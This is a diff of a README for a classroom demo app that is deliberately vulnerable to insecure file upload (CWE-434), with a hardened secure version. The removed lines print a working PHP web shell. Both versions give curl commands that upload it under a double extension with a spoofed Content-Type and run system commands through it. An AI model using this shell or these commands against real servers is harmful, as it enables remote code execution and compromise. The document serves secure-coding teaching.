@@ -1,124 +1,99 @@
-📷 PixelNest — Insecure File Upload (CWE-434) Demo
-Assigned vulnerability: CWE-434 — Unrestricted Upload of File with Dangerous Type Video demo: 🔗 [add your Google Drive link here after recording/uploading]
+# 📷 PixelNest — Insecure File Upload Demo (CWE-434)
 
-PixelNest is a deliberately vulnerable "upload a profile photo" web app, built to demonstrate CWE-434 end to end: a realistic three-part flaw, a working exploit that achieves remote code execution, and a fully corrected version that blocks it.
+**Vulnerability:** CWE-434 — Unrestricted Upload of File with Dangerous Type
+**Video walkthrough:** [Watch here](https://drive.google.com/file/d/1zw_3SBJ-r4CJe7mXNu53GdmBXYFelMO2/view?usp=sharing)
 
-The full attack walkthrough and remediation explanation are in the linked video. This README covers what's in the repo, how the vulnerability works, and how to run both versions yourself.
+PixelNest is a small "upload a profile photo" app built to demonstrate CWE-434 —
+a vulnerable version that can be exploited for remote code execution, and a fixed
+version that blocks the same attack.
 
-Table of Contents
-What the app does
-Where the vulnerability lives
-The attack, in short
-How it's fixed
-Running it locally
-Reproducing the exploit
-Repo structure
-Disclaimer
-1. What the app does (normal use)
-PixelNest is a two-page app:
+---
 
-File	Role
-public/index.php	Upload form — pick a JPG/JPEG/PNG file and submit it.
-public/upload.php	Server-side handler that receives and saves the upload.
-public/gallery.php	Public gallery showing every uploaded file.
-Uploaded files are written into public/uploads/, which is served directly by the web server — anything placed there is reachable at http://<host>/uploads/<filename>.
+## What's in the repo
 
-2. Where the vulnerability lives
-All three flaws live in public/upload.php, each marked with a [FLAW #n] comment in the code:
+- **`public/`** — the vulnerable app
+- **`secure-version/`** — the same app, fixed
 
-#	Flaw	Why it's dangerous
-1	The "extension check" only tests whether an allowed substring (.jpg, .png, etc.) appears anywhere in the filename, via stripos($originalName, $goodExt) — instead of validating the file's true final extension.	A file named shell.jpg.php contains .jpg, so it passes — but its real extension is .php.
-2	The "type check" trusts $_FILES['file']['type'], the Content-Type header the client sends in the upload request.	Fully attacker-controlled. Any HTTP client (curl, Burp, Postman) can label any file image/jpeg regardless of what it actually contains.
-3	The file is saved under its original, attacker-supplied filename, directly inside a public, script-executable directory — no re-encoding, no content verification.	Whatever name/extension the attacker chose is exactly what lands on disk, ready to be requested and executed later.
-Individually, each of these looks like a "reasonable" check — that's what makes the bug realistic. Together, they add up to one root cause: the server trusts what the filename and headers claim, instead of verifying what the file actually is.
+## The vulnerability
 
-3. The attack, in short
-Attacker writes a minimal PHP web shell and names it shell.jpg.php.
-Attacker uploads it through the public form — or directly via:
-curl -F "file=@shell.jpg.php;type=image/jpeg" http://<host>/upload.php
-spoofing the Content-Type header to image/jpeg.
-The substring check sees .jpg in the name → passes. The MIME check sees the spoofed image/jpeg header → passes. The file is saved as-is: uploads/shell.jpg.php.
-Attacker requests it directly:
-curl "http://<host>/uploads/shell.jpg.php?cmd=whoami"
-Because the file's real extension is .php and the uploads folder executes PHP, the server runs the attacker's code and returns the output — full remote code execution from an "image upload" form.
-Note: none of this requires the attacker to have any access to this repo, this server's filesystem, or its source code. The entire attack surface is the public upload URL — every step above works identically against a real domain name in place of <host>.
+The vulnerable `upload.php` has three flaws:
 
-(Full live demo of this is in the video.)
+1. **Weak extension check** — it only checks if `.jpg`/`.png` appears *anywhere* in the filename. A file named `shell.jpg.php` passes.
+2. **Trusts the Content-Type header** — this is sent by the client and easily spoofed.
+3. **Saves the file under its original name** in a public folder that executes PHP.
 
-4. How it's fixed
-See secure-version/ — a complete, runnable copy of the app. upload.php there carries short ERROR: / FIX: comments marking exactly what was wrong and how each flaw was closed, plus uploads/.htaccess for directory hardening.
+Together, this lets an attacker upload a disguised PHP file and run it directly on
+the server — full remote code execution from an image upload form.
 
-Fix	What it does
-Validate real content, not the name	getimagesize() reads the actual file bytes. A PHP script fails this check no matter what it's named or what Content-Type was sent.
-Never trust the original filename	The server generates a random filename and appends only the verified extension — the attacker's chosen name/extension never touches disk.
-Re-encode the image	Re-saving via GD strips any payload appended after a valid image header.
-Disable execution in the uploads folder	uploads/.htaccess turns off the PHP engine for that directory — defense in depth, even if a bad file ever landed there.
-Extra hardening (recommended in production)	Enforce a max file size (already 5MB here), store uploads outside the web root where possible, run uploads through malware/content scanning, and serve them back with Content-Disposition: attachment and X-Content-Type-Options: nosniff.
-5. Running it locally
+## The fix
+
+`secure-version/upload.php` fixes this by:
+
+- Verifying the file's real content with `getimagesize()`, not the filename or header
+- Saving uploads under a random generated name, never the original
+- Re-encoding the image to strip any hidden payload
+- Disabling script execution in the uploads folder via `.htaccess`
+
+## Running it
+
 Requires PHP 8.x.
 
+```bash
+# Terminal 1 — vulnerable version
 cd public
 php -S 127.0.0.1:8000
-Then open http://127.0.0.1:8000/index.php.
 
-To run the secure version alongside it (useful for comparing behavior side by side), start a second server on a different port in another terminal:
-
+# Terminal 2 — secure version
 cd secure-version
 php -S 127.0.0.1:8001
-Then open http://127.0.0.1:8001/index.php.
+```
 
-6. Reproducing the exploit
-macOS / Linux
-# 1. Create a tiny PHP web shell disguised with a double extension
-cat > shell.jpg.php << 'EOF'
-<?php if (isset($_GET['cmd'])) { system($_GET['cmd']); } ?>
-EOF
+Open `http://127.0.0.1:8000` and `http://127.0.0.1:8001` in your browser.
 
-# 2. Upload it, spoofing the Content-Type like a browser/attacker tool would
-curl -F "file=@shell.jpg.php;type=image/jpeg" http://127.0.0.1:8000/upload.php
+## Reproducing the exploit
 
-# 3. Trigger it directly
-curl "http://127.0.0.1:8000/uploads/shell.jpg.php?cmd=id"
-Windows (PowerShell)
-PowerShell aliases curl to Invoke-WebRequest, which doesn't support -F. Remove the alias first so curl resolves to the real curl.exe:
+⚠️ Local testing only — don't run this against a server you don't own.
 
-Remove-Item alias:curl -ErrorAction SilentlyContinue
+1. Create a file named `shell.jpg.php` containing a minimal PHP script that runs a
+   command passed in a `cmd` query parameter (see the video for the exact code —
+   left out here since some antivirus tools flag web-shell snippets even in plain text).
+2. Upload it with curl, spoofing the Content-Type:
+   ```bash
+   curl -F "file=@shell.jpg.php;type=image/jpeg" http://127.0.0.1:8000/upload.php
+   ```
+3. Trigger it directly:
+   ```bash
+   curl "http://127.0.0.1:8000/uploads/shell.jpg.php?cmd=id"
+   ```
+   *(Windows: use `whoami` instead of `id`, and run `Remove-Item alias:curl` first
+   so `curl` isn't PowerShell's built-in alias.)*
 
-# 1. Create the disguised PHP web shell
-Set-Content -Path shell.jpg.php -Value '<?php if (isset($_GET[''cmd''])) { system($_GET[''cmd'']); } ?>'
+Repeat against port `8001` — the upload will be rejected, and the file will never
+be saved.
 
-# 2. Upload it, spoofing the Content-Type
-curl -F "file=@shell.jpg.php;type=image/jpeg" http://127.0.0.1:8000/upload.php
+> Note: none of this needs access to this repo or filesystem — a real attacker only
+> needs the public upload URL. The same steps work against any real domain.
 
-# 3. Trigger it directly (Windows has no `id` command — use `whoami` or `dir`)
-curl "http://127.0.0.1:8000/uploads/shell.jpg.php?cmd=whoami"
-curl "http://127.0.0.1:8000/uploads/shell.jpg.php?cmd=dir"
-Confirming the fix
-Run the same three steps against port 8001 instead of 8000. The upload will be rejected with Not a valid JPG/PNG image., and the follow-up request for the file will return 404 Not Found — it was never written to disk.
+## Repo structure
 
-7. Repo structure
+```
 insecure-upload-demo/
 ├── README.md
-├── public/                        ← the vulnerable app (what you run)
+├── public/                 vulnerable app
 │   ├── index.php
-│   ├── upload.php                 ← the vulnerable code (see [FLAW #1..3] comments)
+│   ├── upload.php           flaws marked [FLAW #1..3]
 │   ├── gallery.php
-│   ├── style.css
-│   └── uploads/                   ← where uploaded files land (web-accessible)
-└── secure-version/                ← fixed, runnable copy of the whole app
+│   └── uploads/
+└── secure-version/         fixed app
     ├── index.php
-    ├── upload.php                 ← ERROR/FIX comments mark each corrected flaw
+    ├── upload.php           fixes marked ERROR: / FIX:
     ├── gallery.php
-    ├── style.css
     └── uploads/
-        └── .htaccess              ← disables script execution in this folder
+        └── .htaccess         disables script execution
+```
 
+## Disclaimer
 
-
-
-
-
-
-
-
-
+Built for a classroom assignment on secure coding practices only. Do not deploy
+this app, or its upload-handling pattern, anywhere reachable from the public
+internet. Keep all testing on `127.0.0.1` or an isolated network you control.
